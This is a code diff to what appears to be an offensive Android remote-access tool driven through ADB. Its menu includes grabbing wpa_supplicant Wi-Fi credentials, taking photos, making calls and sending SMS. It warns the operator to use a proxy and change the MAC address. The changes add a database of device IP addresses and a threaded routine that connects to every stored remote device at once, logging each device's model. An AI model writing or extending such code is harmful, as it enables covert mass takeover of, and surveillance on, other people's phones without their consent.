@@ -10,7 +10,7 @@ import subprocess
 import webbrowser
 import datetime
 import re
-
+import query
 
 page_1 = f'''                    {COLORS.REDL}[ {COLORS.FIOL}1{COLORS.REDL}  ] {COLORS.OKNL} Devices List                        {COLORS.REDL}[ {COLORS.FIOL}16{COLORS.REDL} ] {COLORS.OKNL} Open location on Google Earth
                     {COLORS.REDL}[ {COLORS.FIOL}2{COLORS.REDL}  ] {COLORS.OKNL} Disconnect all devices              {COLORS.REDL}[ {COLORS.FIOL}17{COLORS.REDL} ] {COLORS.OKNL} Show info of device   
@@ -27,8 +27,8 @@ page_1 = f'''                    {COLORS.REDL}[ {COLORS.FIOL}1{COLORS.REDL}  ] {
                     {COLORS.REDL}[ {COLORS.FIOL}13{COLORS.REDL} ] {COLORS.OKNL} Dump System Info                    {COLORS.REDL}[ {COLORS.FIOL}28{COLORS.REDL} ] {COLORS.OKNL} Grab wpa_supplicant
                     {COLORS.REDL}[ {COLORS.FIOL}14{COLORS.REDL} ] {COLORS.OKNL} List of all apps                    {COLORS.REDL}[ {COLORS.FIOL}29{COLORS.REDL} ] {COLORS.OKNL} Port Forwarding
                     {COLORS.REDL}[ {COLORS.FIOL}15{COLORS.REDL} ] {COLORS.OKNL} Star Apps                           {COLORS.REDL}[ {COLORS.FIOL}30{COLORS.REDL} ] {COLORS.OKNL} Take a Photo
-                    {COLORS.REDL}[ {COLORS.FIOL}31{COLORS.REDL} ] {COLORS.OKNL} Reconnect offline devices           {COLORS.REDL}[ {COLORS.FIOL}32{COLORS.REDL} ] {COLORS.OKNL} connect over usb emu
-                    {COLORS.REDL}[ {COLORS.FIOL}33{COLORS.REDL} ] {COLORS.OKNL} Calling Menu                        {COLORS.REDL}[ {COLORS.FIOL}34{COLORS.REDL} ] {COLORS.OKNL} Message Sending           
+                    {COLORS.REDL}[ {COLORS.FIOL}31{COLORS.REDL} ] {COLORS.OKNL} Reconnect offline devices           {COLORS.REDL}[ {COLORS.FIOL}32{COLORS.REDL} ] {COLORS.OKNL} Message Sending
+                    {COLORS.REDL}[ {COLORS.FIOL}33{COLORS.REDL} ] {COLORS.OKNL} Calling Menu                                   
 
              {COLORS.REDL}[ {COLORS.FIOL}0{COLORS.REDL} ] {COLORS.OKNL} Exit {COLORS.FIOL}               {COLORS.REDL}[ {COLORS.FIOL}66{COLORS.REDL} ]{COLORS.OKNL} Clear Console               {COLORS.REDL}[ {COLORS.FIOL}77{COLORS.REDL} ]{COLORS.OKNL} Disable Server
 
@@ -48,24 +48,48 @@ def make_tmp(ip):
     title = title.decode()
     if "exists" in title:
         print(' Folder exist. Good boyy ghe-ge\n')
+    else:
+        pass
 
-
+lock = threading.Lock()
 def conn(ip_address):
+    info = ''
     IP_ADDR = ip_address.split(":")[0]
     IP_PORT = ip_address.split(":")[1]
     #subprocess.call(f" adb connect {IP_ADDR}:{IP_PORT}", shell=True)
     pipe = subprocess.Popen(["adb", "connect", f"{IP_ADDR}:{IP_PORT}"], stdout=subprocess.PIPE)
     title, error = pipe.communicate()
     title = title.decode()
-    
-    if 'connected' in title:
-        print(f' {COLORS.FIOL}{title}')
-
-
+    try:
+        lock.acquire(True)
+        #res = cursor.execute('''...''',(host,))
+        # do something
+        if 'connected' in title:
+            print(f' {COLORS.FIOL}{title}')
+            pipe = subprocess.Popen(["adb", "-s" f"{IP_ADDR}:{IP_PORT}", "shell", "getprop", "ro.product.name", "ro.product.model"], stdout=subprocess.PIPE)
+            title, error = pipe.communicate()
+            title1 = title.decode()
+            if 'command not found' in title1:
+                title1 = ''
+            pipe = subprocess.Popen(["adb", "-s" f"{IP_ADDR}:{IP_PORT}", "shell", "getprop", "ro.product.device"], stdout=subprocess.PIPE)
+            title, error = pipe.communicate()
+            title2 = title.decode()
+            if 'command not found' in title2:
+                title2 = ''
+            try:
+                info = f'{title1} {title2}'.replace("\n", " | ")
+            except:
+                info = ''
+            make_tmp(IP_ADDR)
+            query.init.insert(IP_ADDR, IP_PORT, info, 'online')
+        else:
+            query.init.insert(IP_ADDR, IP_PORT, info, 'offline')
+    finally:
+        lock.release()
 def score_board():
     alld = 0
     actived = 0
-    pipe = subprocess.Popen(["adb", "devices", '-l'], stdout=subprocess.PIPE)
+    """pipe = subprocess.Popen(["adb", "devices", '-l'], stdout=subprocess.PIPE)
     title, error = pipe.communicate()
     title = title.decode()
     if len(title) <= 26:
@@ -84,7 +108,9 @@ def score_board():
                 if 'List of devices attached' in device:
                     continue
                 if 'List of devices attached' not in device and device != '':
-                    alld +=1
+                    alld +=1"""
+    alld = query.init.view_count()
+    actived = query.init.view_online()
     scoreboard = f"""                    ___________________________
                     |Active Devices: {actived}        |
                     |                         |
@@ -93,13 +119,16 @@ def score_board():
     print(scoreboard)
 
 def android_debug():
-    import os
-
+    #query.init
+    #query.init.view()
+    #query.init.insert('192.168.0.1', 5555, 'test', 'offline')
+    #query.init.insert('192.168.0.4', 5553, 'test2', 'online')
     username = os.getlogin()
     global path_to_file
     ip = None
 
     os.system('clear')
+    query.init.make_offline()
     print(banner.banner)
     print(f"\n{COLORS.WHSL}                                    Starting Android Debug Bridge shell...\n")
     print(f"\n{COLORS.REDL} Warning! Use proxy for connection to Devices and don't forget to change MacAddress.\n{COLORS.REDL}")
@@ -114,14 +143,14 @@ def android_debug():
     while True:
         try:
             option = input(
-                f"{COLORS.FIOL} └──> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} Just Enter Function Number: {COLORS.WHSL}")
+                f"{COLORS.FIOL} ───> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} Just Enter Function Number: {COLORS.WHSL}")
         except KeyboardInterrupt:
             return
 
         if option == '1':
-            print(f"\n{COLORS.FIOL} [1]{COLORS.OKNL} Live Devices\n{COLORS.FIOL} [2]{COLORS.OKNL} All Devices\n{COLORS.ENDL}")
+            print(f"\n{COLORS.FIOL} [1]{COLORS.OKNL} Live Devices\n{COLORS.FIOL} [2]{COLORS.OKNL} All Devices ADB\n {COLORS.FIOL}[3]{COLORS.OKNL} All devices DataBase{COLORS.ENDL}")
             option_two = input(
-                f"{COLORS.FIOL} └──> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} Just Enter Function Number: {COLORS.WHSL}")
+                f"{COLORS.FIOL} ───> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} Just Enter Function Number: {COLORS.WHSL}")
             if option_two == '1':
                 pipe = subprocess.Popen(["adb", "devices", '-l'], stdout=subprocess.PIPE)
                 title, error = pipe.communicate()
@@ -148,6 +177,16 @@ def android_debug():
                             print(f'      {COLORS.GNSL}List of devices attached{COLORS.ENDL}')
                         if 'List of devices attached' not in device and device != '':
                             print(f'{COLORS.FIOL} [{i}] {COLORS.OKNL} {device}{COLORS.ENDL}')
+            elif option_two == '3':
+                database = query.init.view_devices()
+                for i, device in enumerate(database):
+                    device = str(device)
+                    #print(device)
+                    
+                    device_ip = str(device.split(",")[1]).replace("'","").replace(")","").strip()
+                    device_port = str(device.split(",")[2]).replace("'","").replace(")","").strip()
+                    device_info = str(device.split(",")[3]).replace("'","").replace(")","").strip()
+                    print(f'{COLORS.FIOL} [{i}]  {COLORS.OKNL} {device_ip}:{device_port} - {device_info}{COLORS.ENDL}')
         elif option == '2':
             pipe = subprocess.Popen(["adb", "disconnect"], stdout=subprocess.PIPE)
             title, error = pipe.communicate()
@@ -156,35 +195,87 @@ def android_debug():
             ip = None
 
         elif option == '3':
-            print(f"\n [1] Connect with TCP/IP\n [2] Connect to active devices\n")
-            option_two = input(f"{COLORS.FIOL} └──> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} Just Enter Function Number: {COLORS.WHSL}")
+            print(f"\n [1] Connect over TCP/IP\n [2] Connect to active devices\n [3] Connect to device from database\n [4] Connect over USB")
+            option_two = input(f"{COLORS.FIOL} ───> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} Just Enter Function Number: {COLORS.WHSL}")
             if option_two == '1':
                 try:
                     ip = input(f" Ip device{COLORS.GNSL}{COLORS.ENDL}: ")
                     port_device = input(f" Port device{COLORS.GNSL}{COLORS.ENDL}: ")
                     ipaddr = f'{ip}:{port_device}'
                     conn(ipaddr)
-                    make_tmp(ip)
                 except KeyboardInterrupt:
                     continue
             elif option_two == '2':
-               pipe = subprocess.Popen(["adb", "devices", '-l'], stdout=subprocess.PIPE)
-               title, error = pipe.communicate()
-               title = title.decode()
-               if len(title) <= 26:
-                   print(f"\n{COLORS.REDL} You are not connect to device.\n")
-               else:
-                   devices = str(title).split("\n")
-                   for i, device in enumerate(devices):
-                       if 'List of devices attached' in device:
-                           print(f'      {COLORS.GNSL}List of devices attached{COLORS.ENDL}')
-                       if ' device ' in device and 'List of devices attached' not in device and 'offline' not in device:
-                           print(f'{COLORS.FIOL} [{i}]  {COLORS.OKNL} {device}{COLORS.ENDL}')
-               connect_to = input(" Connect to: ")
-               for i, device in enumerate(devices):
-                    if ' device ' in device and 'List of devices attached' not in device and 'offline' not in device:
-                        if int(i) == int(connect_to):
-                            ip = str(device).split(":")[0]
+                pipe = subprocess.Popen(["adb", "devices", '-l'], stdout=subprocess.PIPE)
+                title, error = pipe.communicate()
+                title = title.decode()
+                if len(title) <= 26:
+                    print(f"\n{COLORS.REDL} You are not connect to device.\n")
+                else:
+                    devices = str(title).split("\n")
+                    for i, device in enumerate(devices):
+                        if 'List of devices attached' in device:
+                            print(f'      {COLORS.GNSL}List of devices attached{COLORS.ENDL}')
+                        if ' device ' in device and 'List of devices attached' not in device and 'offline' not in device:
+                            print(f'{COLORS.FIOL} [{i}]  {COLORS.OKNL} {device}{COLORS.ENDL}')
+                    connect_to = input(" Connect to: ")
+                    for i, device in enumerate(devices):
+                            if ' device ' in device and 'List of devices attached' not in device and 'offline' not in device:
+                                if int(i) == int(connect_to):
+                                    ip = str(device).split(":")[0]
+            elif option_two == '3':
+                print(f"\n [1] Connect To One device\n [2] Connect to all devices\n")
+                option_two = input(f"{COLORS.FIOL} ───> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} Just Enter Function Number: {COLORS.WHSL}")
+                if option_two == '1':
+                    database = query.init.view_devices()
+                    for i, device in enumerate(database):
+                        device = str(device)
+                        #print(device)
+                        
+                        device_ip = str(device.split(",")[1]).replace("'","").replace(")","").strip()
+                        device_port = str(device.split(",")[2]).replace("'","").replace(")","").strip()
+                        device_info = str(device.split(",")[3]).replace("'","").replace(")","").strip()
+                        print(f'{COLORS.FIOL} [{i}]  {COLORS.OKNL} {device_ip}:{device_port} - {device_info}{COLORS.ENDL}')
+                    print(" Example: 192.168.1.105:5555 or Alcatel")
+                    ipd = input(f"{COLORS.FIOL} ───> {COLORS.WHSL}{username}@adb@{str(ip).replace('None','')} ──>{COLORS.FIOL} device: {COLORS.WHSL}")
+                    conn(ipd)
+                elif option_two == '2':
+                    list_ips = query.init.all_ip()
+                    for ipd in list_ips:
+                        #print(ip)
+                        ip_adr = str(ipd).strip().split(",")[0].replace("('", "").replace("'","")
+                        port = str(ipd).strip().split(",")[1].replace(")","")
+                        if len(ip_adr) < 7 and len(port) == 0 or "'', " ''"" in ipd:
+                            continue
+                        else:
+                            ipaddr = f'{ip_adr}:{port}'.replace(" ","").strip()
+                            #print(ipaddr)
+                            thread = threading.Thread(target=conn, args=(ipaddr,))
+                            thread.start()
+            elif option_two == '4':
+                print(f"\n Connecting to device over usb.\n")
+                try:
+                    #port_device = input(f" Port device{COLORS.GNSL}{COLORS.ENDL}: ")
+                    pipe = subprocess.Popen(["adb", "devices", "-l"], stdout=subprocess.PIPE)
+                    title, error = pipe.communicate()
+                    title = title.decode()
+                    devices = str(title).split("\n")
+                    for i, device in enumerate(devices):
+                        if device == '':
+                            continue
+                        if 'List of devices attached' in device:
+                            print(f'      {COLORS.GNSL}List of devices attached:{COLORS.ENDL}')
+                        else:
+                            match = re.match('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', device)
+                            #print(match)
+                            if not match:   
+                                print(f'{COLORS.FIOL} [{i}]  {COLORS.OKNL} {device}{COLORS.ENDL}')
+                    ip = input(" Connect to: ")
+                except KeyboardInterrupt:
+                    continue
+                except:
+                    pass
+                             
         elif option == '4':
             print(f"\n Starting shell to device.\n")
             if not ip:
@@ -560,26 +651,7 @@ def android_debug():
         elif option == '31':
             subprocess.call("adb reconnect offline >> /dev/null", shell=True)
             print("\n Trying reconnect offline devices.\n")
-
         elif option == '32':
-            print(f"\n Connecting to device over usb.\n")
-            try:
-                #port_device = input(f" Port device{COLORS.GNSL}{COLORS.ENDL}: ")
-                pipe = subprocess.Popen(["adb", "devices", "-l"], stdout=subprocess.PIPE)
-                title, error = pipe.communicate()
-                title = title.decode()
-                devices = str(title).split("\n")
-                for i, device in enumerate(devices):
-                    if device == '':
-                        continue
-                    if 'List of devices attached' in device:
-                        print(f'      {COLORS.GNSL}List of devices attached{COLORS.ENDL}')
-                    print(f'{COLORS.FIOL} [{i}]  {COLORS.OKNL} {device}{COLORS.ENDL}')
-                connect_to = input(" Connect to: ")
-                make_tmp(ip)
-            except KeyboardInterrupt:
-                continue
-        elif option == '33':
             print('\n Calling menu.')
             #shell am start -a android.intent.action.CALL -d tel:"phone no. to call"
             phonenumber = input("Enter phonenumber to call: ")
@@ -590,7 +662,7 @@ def android_debug():
                 print(f'{COLORS.REDL} Error:{title}{COLORS.ENDL}')
             else:
                 print(f'{COLORS.WHSL} {title}')
-        elif option == '34':
+        elif option == '33':
             print('\n Send messages.')
             phonenumber = input("Phonenumber to send message: ")
             body_sms = input("SMS BODY: ")
